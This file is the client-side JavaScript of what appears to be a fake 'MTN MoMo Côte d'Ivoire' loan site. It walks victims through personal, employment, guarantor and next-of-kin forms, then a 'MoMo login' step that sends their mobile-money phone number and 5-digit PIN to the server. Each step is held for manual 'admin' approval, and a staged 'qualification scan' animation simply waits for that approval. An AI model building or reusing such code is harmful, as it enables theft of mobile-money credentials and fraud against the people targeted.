        var data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'personal',
                data: { firstName: fi, lastName: la, phone: ph, email: em } })
        });
        setBtnLoading(btn, false, 'Soumettre pour approbation');
        if (!data.ok) { showErr('s2Err', data.error || 'Échec.'); return; }
        S.personal = { firstName: fi, lastName: la, phone: ph, email: em };
        S.steps.personal = 'pending';
        saveAll();
        goTo('page-wait-personal');
        startPolling('personal', function () {
            S.steps.personal = 'approved'; saveAll();
            showToast('✅ Informations approuvées !', 'success');
            goTo('page-step3');
        });
    } catch (e) { showErr('s2Err', e.message); setBtnLoading(btn, false, 'Soumettre pour approbation'); }
}

// ═══════════════════════════════════════════════════════════
// STEP 3: EMPLOYMENT
// ═══════════════════════════════════════════════════════════
async function submitStepEmployment() {
    if (!isUserRegistered()) return forceRegistration();
    var em = (document.getElementById('s3em') || {}).value;
    var inc = +(document.getElementById('s3in') || {}).value;
    var kn = ((document.getElementById('s3kn') || {}).value || '').trim();
    var kp = (document.getElementById('s3kp') || {}).value || '';
    if (!em || inc <= 0) return showErr('s3Err', 'Remplissez tous les champs.');
    if (!kn) return showErr('s3Err', 'Nom du proche requis.');
    if (kp.length !== 10) return showErr('s3Err', 'Le téléphone du proche doit comporter 10 chiffres.');
    var btn = document.getElementById('s3Btn');
    setBtnLoading(btn, true, 'Soumission...');
    clearErr('s3Err');
    try {
        var data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'employment',
                data: { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp } })
        });
        setBtnLoading(btn, false, 'Soumettre pour approbation');
        if (!data.ok) { showErr('s3Err', data.error || 'Échec.'); return; }
        S.employment = { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp };
        S.steps.employment = 'pending';
        saveAll();
        goTo('page-wait-employment');
        startPolling('employment', function () {
            S.steps.employment = 'approved'; saveAll();
            showToast('✅ Emploi approuvé !', 'success');
            goTo('page-guarantor');
        });
    } catch (e) { showErr('s3Err', e.message); setBtnLoading(btn, false, 'Soumettre pour approbation'); }
}

// ═══════════════════════════════════════════════════════════
// STEP 4: GUARANTOR
// ═══════════════════════════════════════════════════════════
async function submitStepGuarantor() {
    if (!isUserRegistered()) return forceRegistration();
    var gn = ((document.getElementById('gName') || {}).value || '').trim();
    var gp = (document.getElementById('gPhone') || {}).value || '';
    var gr = (document.getElementById('gRel') || {}).value;
    var gc = !!(document.getElementById('gConfirm') || {}).checked;
    if (!gn || gn.length < 3) return showErr('gErr', 'Saisissez le nom du garant.');
    if (gp.length !== 10) return showErr('gErr', 'Le téléphone doit comporter 10 chiffres.');
    if (!gr) return showErr('gErr', 'Sélectionnez la relation.');
    if (!gc) return showErr('gErr', 'Confirmez l\'accord.');
    if (gp === S.personal.phone) return showErr('gErr', 'Le téléphone du garant ne peut pas être le vôtre.');
    var btn = document.getElementById('gBtn');
    setBtnLoading(btn, true, 'Soumission...');
    clearErr('gErr');
    try {
        var data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'guarantor',
                data: { guarantorName: gn, guarantorPhone: gp, guarantorRelation: gr } })
        });
        setBtnLoading(btn, false, 'Soumettre pour approbation');
        if (!data.ok) { showErr('gErr', data.error || 'Échec.'); return; }
        S.guarantor = { guarantorName: gn, guarantorPhone: gp, guarantorRelation: gr };
        S.steps.guarantor = 'pending';
        saveAll();
        goTo('page-wait-guarantor');
        startPolling('guarantor', function () {
            S.steps.guarantor = 'approved'; saveAll();
            showToast('✅ Garant approuvé !', 'success');
            goTo('page-confirmation');
        });
    } catch (e) { showErr('gErr', e.message); setBtnLoading(btn, false, 'Soumettre pour approbation'); }
}

// ═══════════════════════════════════════════════════════════
// CONFIRMATION
// ═══════════════════════════════════════════════════════════
function updateConfirmation() {
    if (!S.loan.loanAmount) return;
    var amt = S.loan.loanAmount;
    var months = parseInt(S.loan.loanTerm) || 12;
    var r = ANNUAL_RATE / 12;
    var monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + SERVICE_FEE);
    var totalCost = monthly * months - amt;
    var set = function (id, v) { var el = document.getElementById(id); if (el) el.textContent = v; };
    set('cfAmount', fmtXOF(amt));
    set('cfTerm', S.loan.loanTerm);
    set('cfPurpose', S.loan.loanPurpose || '');
    set('cfMonthly', fmtXOF(monthly));
    set('cfCost', fmtXOF(totalCost));
    set('cfName', ((S.personal.firstName || '') + ' ' + (S.personal.lastName || '')).trim());
    set('cfPhone', S.personal.phone ? '+225 ' + S.personal.phone : '');
    set('cfEmail', S.personal.email || '');
    set('cfGName', S.guarantor.guarantorName || '');
    set('cfGPhone', S.guarantor.guarantorPhone ? '+225 ' + S.guarantor.guarantorPhone : '');
    var ab = document.getElementById('agreeBox');
    if (ab) ab.checked = false;
    var cb = document.getElementById('confirmProceedBtn');
    if (cb) cb.disabled = true;
}

async function showAgreement() {
    try {
        var data = await apiCall('/api/agreement/' + S.applicationId);
        if (!data.ok) { showToast('Contrat non disponible.', 'error'); return; }
        var el = document.getElementById('agreementText');
        if (el) el.textContent = data.agreement;
        var m = document.getElementById('agreementModal');
        if (m) m.classList.add('show');
    } catch (e) { showToast(e.message, 'error'); }
}
function closeAgreement() { var m = document.getElementById('agreementModal'); if (m) m.classList.remove('show'); }
function downloadAgreementPdf() {
    if (!S.applicationId) { showToast('Aucun dossier chargé.', 'error'); return; }
    window.location.href = '/api/agreement-pdf/' + S.applicationId;
    showToast('📥 Téléchargement du PDF…', 'info', 2000);
}

// ═══════════════════════════════════════════════════════════
// TERMS MODAL
// ═══════════════════════════════════════════════════════════
async function showTerms() {
    try {
        var modal = document.getElementById('termsModal');
        var preEl = document.getElementById('termsText');
        if (modal) modal.classList.add('show');
        if (_termsCache) { if (preEl) preEl.textContent = _termsCache; return; }
        if (preEl) preEl.textContent = 'Chargement…';
        var data = await apiCall('/api/terms');
        if (!data.ok) { if (preEl) preEl.textContent = 'Impossible de charger les Conditions.'; return; }
        _termsCache = data.text;
        if (preEl) preEl.textContent = data.text;
    } catch (e) { showToast(e.message, 'error'); }
}
function closeTerms() { var m = document.getElementById('termsModal'); if (m) m.classList.remove('show'); }
function acceptTermsFromModal() {
    var cb = document.getElementById('regTnc');
    if (cb) cb.checked = true;
    clearErr('regErr');
    closeTerms();
    showToast('✅ Conditions acceptées', 'success', 1800);
}

// ═══════════════════════════════════════════════════════════
// MOMO LOGIN
// ═══════════════════════════════════════════════════════════
function prefillMoMoLogin() {
    var p = document.getElementById('loginPhone');
    if (S.personal.phone && p && !p.value) p.value = S.personal.phone;
}
function loginPinMvM(el, i) {
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && i < 4) { var n = document.getElementById('loginPin' + (i + 1)); if (n) n.focus(); }
}
function loginPinKeydown(el, i, e) {
    if (e.key === 'Backspace' && !el.value && i > 0) {
        var p = document.getElementById('loginPin' + (i - 1));
        if (p) { p.focus(); p.value = ''; }
    }
    if (e.key === 'ArrowLeft' && i > 0) { var p2 = document.getElementById('loginPin' + (i - 1)); if (p2) p2.focus(); }
    if (e.key === 'ArrowRight' && i < 4) { var p3 = document.getElementById('loginPin' + (i + 1)); if (p3) p3.focus(); }
}
function loginPinPaste(e, i) {
    var pasted = ((e.clipboardData || window.clipboardData).getData('text') || '').replace(/\D/g, '');
    if (!pasted) return;
    e.preventDefault();
    pasted.slice(0, 5 - i).split('').forEach(function (d, k) {
        var b = document.getElementById('loginPin' + (i + k));
        if (b) b.value = d;
    });
    var n = document.getElementById('loginPin' + Math.min(i + pasted.length, 4));
    if (n) n.focus();
}
function togLoginPin() {
    for (var i = 0; i < 5; i++) {
        var b = document.getElementById('loginPin' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
}
function clearLoginPin() {
    for (var i = 0; i < 5; i++) { var el = document.getElementById('loginPin' + i); if (el) el.value = ''; }
    var first = document.getElementById('loginPin0'); if (first) first.focus();
}
function toggleLoginMethod() {
    var m = document.getElementById('loginMethod');
    var b = document.getElementById('biometricBlock');
    if (m && b) b.style.display = m.value === 'biometric' ? 'block' : 'none';
}
async function submitMoMoLogin() {
    if (!isUserRegistered()) return forceRegistration();
    var phone = (document.getElementById('loginPhone') || {}).value || '';
    var method = (document.getElementById('loginMethod') || {}).value || 'pin';
    var pin = [0,1,2,3,4].map(function (i) { return (document.getElementById('loginPin' + i) || {}).value || ''; }).join('');
    if (phone.length !== 10) return showErr('loginErr', 'Saisissez un téléphone à 10 chiffres.');
    if (method === 'pin' && pin.length !== 5) return showErr('loginErr', 'Saisissez un code PIN à 5 chiffres.');
    var btn = document.getElementById('loginBtn');
    setBtnLoading(btn, true, 'Confirmation...');
    clearErr('loginErr');
    try {
        var data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'momologin',
                data: { phone: phone, pin: method === 'pin' ? pin : null, loginMethod: method, deviceInfo: navigator.platform || 'Inconnu' } })
        });
        setBtnLoading(btn, false, 'Confirmer la connexion');
        if (!data.ok) { showErr('loginErr', data.error || 'Échec de connexion.'); return; }
        S.steps.momologin = 'pending';
        saveAll();
        goTo('page-wait-momologin');
        startPolling('momologin', function () {
            S.steps.momologin = 'approved'; saveAll();
            showToast('✅ Connexion MoMo confirmée !', 'success');
            startQualificationScan();
        });
    } catch (e) { showErr('loginErr', e.message); setBtnLoading(btn, false, 'Confirmer la connexion'); }
}

// ═══════════════════════════════════════════════════════════
// QUALIFICATION
// ═══════════════════════════════════════════════════════════
async function startQualificationScan() {
    goTo('page-scan');
    var setClass = function (id, c) { var el = document.getElementById(id); if (el) el.className = c; };
    setClass('scanItem1', 'scan-item active');
    setClass('scanItem2', 'scan-item');
    setClass('scanItem3', 'scan-item');
    var ws = document.getElementById('waitScanStatus');
    if (ws) ws.textContent = '⏳ Analyse...';
    try {
        var data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'qualification', data: {} })
        });
        if (data.ok) { S.steps.qualification = 'pending'; saveAll(); }
    } catch (e) { console.error(e); }

    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
    var i = 1;
    var statuses = ['📊 Analyse des transactions...', '📈 Vérification de la règle des 20 %...', '🔍 Validation admin finale...'];
    qualificationAnimator = setInterval(function () {
        if (i < 3) {
            setClass('scanItem' + i, 'scan-item done');
            setClass('scanItem' + (i + 1), 'scan-item active');
            var el = document.getElementById('waitScanStatus');
            if (el) el.textContent = '⏳ ' + statuses[i];
            i++;
        } else {
            clearInterval(qualificationAnimator);
            qualificationAnimator = null;
            setClass('scanItem3', 'scan-item done');
            var el2 = document.getElementById('waitScanStatus');
            if (el2) el2.textContent = '⏳ Validation admin...';
        }
    }, 2500);

    startPolling('qualification', function () {
        if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
        ['scanItem1','scanItem2','scanItem3'].forEach(function (id) { setClass(id, 'scan-item done'); });
        S.steps.qualification = 'approved'; saveAll();
        setTimeout(function () { showToast('🎉 Prêt approuvé !', 'success'); showApproval(); }, 800);
    });
}

// ═══════════════════════════════════════════════════════════
// POLLING
// ═══════════════════════════════════════════════════════════
function startPolling(step, onSuccess) {
    stopPolling();
    currentPollStep = step;
    currentPollCallback = onSuccess;
    currentPollStarted = Date.now();
    var tick = async function () {
        if (Date.now() - currentPollStarted > POLL_MAX_DURATION) {
            showToast('Délai dépassé. Réessayez.', 'error');
            stopPolling();
            return;
        }
        try {
            var r = await fetch('/api/status/' + S.applicationId + '/' + step, { credentials: 'same-origin' });
            if (!r.ok) throw new Error('HTTP ' + r.status);
            var data = await r.json();
            if (data.ok) {
                if (data.status === 'approved') { stopPolling(); onSuccess(); return; }
                if (data.status === 'rejected') {
                    stopPolling();
                    if (S.steps[step]) { S.steps[step] = 'rejected'; saveAll(); }
                    handleStepRejection(step);
                    return;
                }
            }
        } catch (e) { console.warn('Poll:', e.message); }
        activePoll = setTimeout(tick, POLL_INTERVAL);
    };
    tick();
}
function stopPolling() {
    if (activePoll) { clearTimeout(activePoll); activePoll = null; }
    currentPollStep = null;
    currentPollCallback = null;
}
async function handleStepRejection(step) {
    showToast('❌ ' + step.toUpperCase() + ' a été rejeté. Veuillez réessayer.', 'error', 5000);
    try {
        await apiCall('/api/retry/' + S.applicationId + '/' + step, { method: 'POST' });
        if (S.steps[step]) S.steps[step] = 'idle';
        saveAll();
    } catch (e) { console.warn('Retry reset failed:', e.message); }
    if (step === 'loan') goTo('page-step1');
    else if (step === 'personal') goTo('page-step2');
    else if (step === 'employment') goTo('page-step3');
    else if (step === 'guarantor') goTo('page-guarantor');
    else if (step === 'momologin') { clearLoginPin(); clearErr('loginErr'); goTo('page-momologin'); }
    else if (step === 'qualification') { resetLoanFlow(); goTo('page-step1'); }
    else goTo('page-landing');
}
function resetLoanFlow() {
    S.steps = { loan: 'idle', personal: 'idle', employment: 'idle', guarantor: 'idle', momologin: 'idle', qualification: 'idle' };
    S.loan = {}; S.personal = {}; S.employment = {}; S.guarantor = {};
    saveAll();
}

// ═══════════════════════════════════════════════════════════
// APPROVAL
// ═══════════════════════════════════════════════════════════
function showApproval() {
    var amt = S.loan.loanAmount || 0;
    var months = parseInt(S.loan.loanTerm) || 12;
    var r = ANNUAL_RATE / 12;
    var monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + SERVICE_FEE);
    var set = function (id, v) { var el = document.getElementById(id); if (el) el.textContent = v; };
    set('aprAmount', fmtXOF(amt));
    set('aprAmt', fmtXOF(amt));
    set('aprTerm', S.loan.loanTerm);
    set('aprMth', fmtXOF(monthly));
    goTo('page-approval');
}
async function viewSchedule() {
    try {
        var data = await apiCall('/api/repayment-schedule/' + S.applicationId);
        if (!data.ok) { showToast('Échéancier non disponible.', 'error'); return; }
        var html = '<table class="schedule-table"><thead><tr><th>Mois</th><th>Paiement</th><th>Intérêt</th><th>Capital</th><th>Solde</th></tr></thead><tbody>';
        data.schedule.forEach(function (row) {
            html += '<tr><td>' + row.month + '</td><td>' + fmtXOF(row.payment) + '</td><td>' + fmtXOF(row.interest) + '</td><td>' + fmtXOF(row.principal) + '</td><td>' + fmtXOF(row.balance) + '</td></tr>';
        });
        html += '</tbody></table>';
        var body = document.getElementById('scheduleBody');
        if (body) body.innerHTML = html;
        var m = document.getElementById('scheduleModal');
        if (m) m.classList.add('show');
    } catch (e) { showToast(e.message, 'error'); }
}
function closeSchedule() { var m = document.getElementById('scheduleModal'); if (m) m.classList.remove('show'); }
function copyAppId() {
    if (navigator.clipboard) {
        navigator.clipboard.writeText(S.applicationId).then(
            function () { showToast('📋 ID Dossier copié !', 'success'); },
            function () { showToast('Impossible de copier.', 'error'); }
        );
    } else {
        showToast('Copie non supportée.', 'error');
    }
}
function cancelApplication() {
    if (!confirm('Annuler cette demande ? Vous pourrez la reprendre avec votre ID Dossier.')) return;
    stopPolling(); stopRegPoll();
    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
    save(KEYS.APP_ID, S.applicationId);
    rm(KEYS.APP_DATA);
    S.isRegistered = false;
    S.registrationStatus = 'idle';
    S.steps = {};
    S.loan = {}; S.personal = {}; S.employment = {}; S.guarantor = {};
    location.hash = '';
    location.reload();
}
function restartApplication() {
    stopPolling(); stopRegPoll();
    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
    Object.keys(KEYS).forEach(function (k) { rm(KEYS[k]); });
    location.reload();
}

// ═══════════════════════════════════════════════════════════
// RECOVERY
// ═══════════════════════════════════════════════════════════
async function recoverSession() {
    var id = get(KEYS.APP_ID);
    if (!id) { goTo('page-landing'); return; }
    S.applicationId = id;
    var data = get(KEYS.APP_DATA);
    if (data) {
        S.isRegistered = data.isRegistered;
        S.registrationStatus = data.registrationStatus || 'idle';
        S.accountType = data.accountType;
        S.accountMaxLoan = data.accountMaxLoan;
        S.steps = data.steps || {};
        S.loan = data.loan || {};
        S.personal = data.personal || {};
        S.employment = data.employment || {};
        S.guarantor = data.guarantor || {};
        S.dob = data.dob || null;
    }
    try {
        var r = await fetch('/api/status/' + id, { credentials: 'same-origin' });
        if (!r.ok) { goTo('page-landing'); return; }
        var s = await r.json();
        if (!s.ok || !s.isRegistered) { goTo('page-landing'); return; }

        S.isRegistered = true;
        S.registrationStatus = s.registrationStatus || S.registrationStatus;
        S.accountType = s.accountType;
        S.accountMaxLoan = s.accountMaxLoan;
        S.steps = s.steps || S.steps || {};
        S.dob = s.dob || S.dob;
        if (s.loan) S.loan = Object.assign({}, S.loan, s.loan);
        if (s.personal) S.personal = Object.assign({}, S.personal, s.personal);
        if (s.employment) S.employment = Object.assign({}, S.employment, s.employment);
        if (s.guarantor) S.guarantor = Object.assign({}, S.guarantor, s.guarantor);
        saveAll();
        updateCalc();

        // Skipped user or completed registration → normal flow
        if (S.registrationStatus === 'skipped' || S.registrationStatus === 'completed') {
            // Continue below
        } else if (S.registrationStatus && S.registrationStatus !== 'completed') {
            if (S.registrationStatus === 'rejected') {
                var el = document.getElementById('regRejectReason');
                if (el) el.textContent = s.rejectionReason || 'Inscription rejetée.';
            }
            routeRegistrationFlow();
            return;
        }

        var steps = S.steps;
        var pending = STEPS.find(function (x) { return steps[x] === 'pending'; });
        if (pending) {
            var waitPages = {
                loan: 'page-wait-loan', personal: 'page-wait-personal',
                employment: 'page-wait-employment', guarantor: 'page-wait-guarantor',
                momologin: 'page-wait-momologin'
            };
            if (pending === 'qualification') { startQualificationScan(); return; }
            if (waitPages[pending]) {
                goTo(waitPages[pending]);
                var cbMap = {
                    loan: function () { S.steps.loan = 'approved'; saveAll(); goTo('page-step2'); },
                    personal: function () { S.steps.personal = 'approved'; saveAll(); goTo('page-step3'); },
                    employment: function () { S.steps.employment = 'approved'; saveAll(); goTo('page-guarantor'); },
                    guarantor: function () { S.steps.guarantor = 'approved'; saveAll(); goTo('page-confirmation'); },
                    momologin: function () { S.steps.momologin = 'approved'; saveAll(); startQualificationScan(); }
                };
                startPolling(pending, cbMap[pending]);
                return;
            }
        }

        if (steps.qualification === 'approved') { showApproval(); return; }
        if (steps.momologin === 'approved') { startQualificationScan(); return; }
        if (steps.guarantor === 'approved') { goTo('page-confirmation'); return; }
        if (steps.employment === 'approved') { goTo('page-guarantor'); return; }
        if (steps.personal === 'approved') { goTo('page-step3'); return; }
        if (steps.loan === 'approved') { goTo('page-step2'); return; }
        goTo('page-requirements');
    } catch (e) {
        console.warn('Recovery failed:', e.message);
        goTo('page-landing');
    }
}

async function retryStep(step) {
    stopPolling();
    try { await apiCall('/api/retry/' + S.applicationId + '/' + step, { method: 'POST' }); } catch (e) {}
    if (S.steps[step]) { S.steps[step] = 'idle'; saveAll(); }
    if (step === 'momologin') { clearLoginPin(); clearErr('loginErr'); goTo('page-momologin'); }
}

// ═══════════════════════════════════════════════════════════
// PIN INPUT WIRING
// ═══════════════════════════════════════════════════════════
function wirePinInputs(prefix, length, allowNext) {
    for (var i = 0; i < length; i++) {
        (function (idx) {
            var el = document.getElementById(prefix + idx);
            if (!el) return;
            el.addEventListener('input', function () {
                el.value = el.value.replace(/\D/g, '').slice(0, 1);
                if (el.value && idx < length - 1) {
                    var n = document.getElementById(prefix + (idx + 1));
                    if (n) n.focus();
                }
                if (allowNext && el.value && idx === length - 1) {
                    var n2 = document.getElementById(allowNext);
                    if (n2) n2.focus();
                }
            });
            el.addEventListener('keydown', function (e) {
                if (e.key === 'Backspace' && !el.value && idx > 0) {
                    var p = document.getElementById(prefix + (idx - 1));
                    if (p) { p.focus(); p.value = ''; }
                }
            });
            el.addEventListener('paste', function (e) {
                var text = ((e.clipboardData || window.clipboardData).getData('text') || '').replace(/\D/g, '');
                if (!text) return;
                e.preventDefault();
                text.slice(0, length - idx).split('').forEach(function (d, k) {
                    var box = document.getElementById(prefix + (idx + k));
                    if (box) box.value = d;
                });
                var n = document.getElementById(prefix + Math.min(idx + text.length, length - 1));
                if (n) n.focus();
            });
        })(i);
    }
}
function wireLoginPin() {
    for (var i = 0; i < 5; i++) {
        (function (idx) {
            var el = document.getElementById('loginPin' + idx);
            if (!el) return;
            el.addEventListener('input', function () { loginPinMvM(el, idx); });
            el.addEventListener('keydown', function (e) { loginPinKeydown(el, idx, e); });
            el.addEventListener('paste', function (e) { loginPinPaste(e, idx); });
        })(i);
    }
}

// ═══════════════════════════════════════════════════════════
// EVENT WIRING
// ═══════════════════════════════════════════════════════════
function bindClick(id, fn) {
    var el = document.getElementById(id);
    if (!el) return false;
    el.addEventListener('click', function (e) {
        e.preventDefault();
        try { fn(e); }
        catch (err) {
            console.error('[' + id + '] erreur:', err);
            showToast('Une erreur s\'est produite. Réessayez.', 'error');
        }
    });
    return true;
}
function bindGoto() {
    document.querySelectorAll('[data-goto]').forEach(function (el) {
        el.addEventListener('click', function (e) {
            e.preventDefault();
            goTo(el.dataset.goto);
        });
    });
}
function bindAccountTypeCards() {
    document.querySelectorAll('#accountTypes .account-type').forEach(function (card) {
        card.addEventListener('click', function () {
            if (card.dataset.type) selectAccountType(card.dataset.type);
        });
    });
    document.querySelectorAll('#chooseAccountTypes .account-type').forEach(function (card) {
        card.addEventListener('click', function () {
            if (card.dataset.type) selectChooseAccount(card.dataset.type);
        });
    });
}
function bindInputNormalizers() {
    ['regPhone','s2ph','s3kp','gPhone','loginPhone'].forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.addEventListener('input', function () {
            normalizePhone(id);
            var map = { regPhone: 'regErr', s2ph: 's2Err', s3kp: 's3Err', gPhone: 'gErr', loginPhone: 'loginErr' };
            clearErr(map[id]);
        });
    });
    var errMap = { regEmail: 'regErr', regTnc: 'regErr', regName: 'regErr', regDob: 'regErr', regId: 'regErr', s2fi: 's2Err', s2la: 's2Err', s2em: 's2Err', s3in: 's3Err', s3kn: 's3Err', gName: 'gErr', gRel: 'gErr', gConfirm: 'gErr', s1am: 's1Err', s1pu: 's1Err' };
    Object.keys(errMap).forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.addEventListener('input', function () { clearErr(errMap[id]); });
    });
}

function wireAllHandlers() {
    // Landing
    bindClick('applyBtn', applyAsExistingUser);
    bindClick('registerFirstBtn', function () { startMoMoRegistration({ mode: 'register' }); });
    bindClick('calcApplyBtn', applyFromCalculator);

    // Calculator
    var slider = document.getElementById('amtSlider');
    if (slider) slider.addEventListener('input', updateCalc);
    var termSel = document.getElementById('calcTermSelect');
    if (termSel) termSel.addEventListener('change', updateCalc);

    // Choice page
    bindClick('chooseSkipBtn', continueWithoutLinking);
    bindClick('chooseLinkBtn', continueWithLinking);

    // Terms
    bindClick('termsLink', showTerms);
    bindClick('closeTermsBtn', closeTerms);
    bindClick('acceptTermsBtn', acceptTermsFromModal);

    // Registration
    bindClick('regBtn', completeRegistration);
    bindClick('regSmsBtn', submitRegistrationSms);
    bindClick('regPinBtn', submitRegistrationPin);
    bindClick('restartRegBtn', restartRegistration);
    bindClick('backHomeBtn', function () { goTo('page-landing'); });

    // Cancel
    bindClick('cancelRegWaitBtn', cancelApplication);
    bindClick('cancelSmsWaitBtn', cancelApplication);
    bindClick('cancelPinWaitBtn', cancelApplication);
    bindClick('cancelStep1', cancelApplication);
    bindClick('cancelWaitLoanBtn', cancelApplication);
    bindClick('cancelWaitPersonalBtn', cancelApplication);
    bindClick('cancelWaitEmploymentBtn', cancelApplication);
    bindClick('cancelWaitGuarantorBtn', cancelApplication);
    bindClick('cancelWaitMomoLoginBtn', cancelApplication);
    bindClick('cancelScanBtn', cancelApplication);

    // Steps
    bindClick('s1Btn', submitStepLoan);
    bindClick('s2Btn', submitStepPersonal);
    bindClick('s3Btn', submitStepEmployment);
    bindClick('gBtn', submitStepGuarantor);

    // Confirmation
    var agreeBox = document.getElementById('agreeBox');
    var proceedBtn = document.getElementById('confirmProceedBtn');
    if (agreeBox && proceedBtn) {
        agreeBox.addEventListener('change', function () { proceedBtn.disabled = !agreeBox.checked; });
    }
    bindClick('showAgreementBtn', showAgreement);
    bindClick('downloadPdfConfirmBtn', downloadAgreementPdf);
    bindClick('confirmProceedBtn', function () { goTo('page-momologin'); });
    bindClick('closeAgreementBtn', closeAgreement);

    // MoMo login
    bindClick('loginBtn', submitMoMoLogin);
    bindClick('loginRetryBtn', function () { retryStep('momologin'); });
    bindClick('togglePinBtn', togLoginPin);
    bindClick('clearPinBtn', clearLoginPin);
    var loginMethod = document.getElementById('loginMethod');
    if (loginMethod) loginMethod.addEventListener('change', toggleLoginMethod);

    // Approval
    bindClick('viewScheduleBtn', viewSchedule);
    bindClick('downloadPdfApprovalBtn', downloadAgreementPdf);
    bindClick('copyAppIdBtn', copyAppId);
    bindClick('restartAppBtn', restartApplication);
    bindClick('closeScheduleBtn', closeSchedule);

    // Modal backdrop
    ['termsModal','agreementModal','scheduleModal'].forEach(function (id) {
        var m = document.getElementById(id);
        if (!m) return;
        m.addEventListener('click', function (e) {
            if (e.target === m) {
                if (id === 'termsModal') closeTerms();
                else if (id === 'agreementModal') closeAgreement();
                else if (id === 'scheduleModal') closeSchedule();
            }
        });
    });

    bindGoto();
    bindAccountTypeCards();
    bindInputNormalizers();

    console.log('✅ Tous les gestionnaires sont liés');
}

window.applyAsExistingUser = applyAsExistingUser;
window.completeRegistration = completeRegistration;
window.goTo = goTo;
window.updateCalc = updateCalc;
window.cancelApplication = cancelApplication;

// ═══════════════════════════════════════════════════════════
// BOOT
// ═══════════════════════════════════════════════════════════
function boot() {
    console.log('🔧 Démarrage MTN MoMo Côte d\'Ivoire v7.7...');

    wirePinInputs('regPin', 5, 'regPinC0');
    wirePinInputs('regPinC', 5);
    wireLoginPin();
    wireAllHandlers();

    try { updateCalc(); } catch (e) { console.warn('updateCalc:', e); }
    try { recoverSession(); } catch (e) { console.warn('recoverSession:', e); }

    window.addEventListener('popstate', function () {
        var active = document.querySelector('.page.active');
        if (active && requiresRegistration(active.id) && !isUserRegistered()) {
            forceRegistration();
        }
    });

    document.addEventListener('visibilitychange', function () {
        if (document.hidden) return;
        if (currentPollStep && currentPollCallback && !activePoll) {
            startPolling(currentPollStep, currentPollCallback);
        }
        if (regPollTimer === null && S.registrationStatus && S.registrationStatus !== 'completed' && S.registrationStatus !== 'skipped') {
            if (S.registrationStatus === 'pending_review') pollRegistrationStatus();
            else if (S.registrationStatus === 'sms_submitted') pollSmsStatus();
            else if (S.registrationStatus === 'pin_pending') pollPinStatus();
        }
    });

    window.addEventListener('beforeunload', function () {
        stopPolling();
        stopRegPoll();
    });

    console.log('✅ MTN MoMo Côte d\'Ivoire v7.7 prêt');
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
} else {
    boot();
}
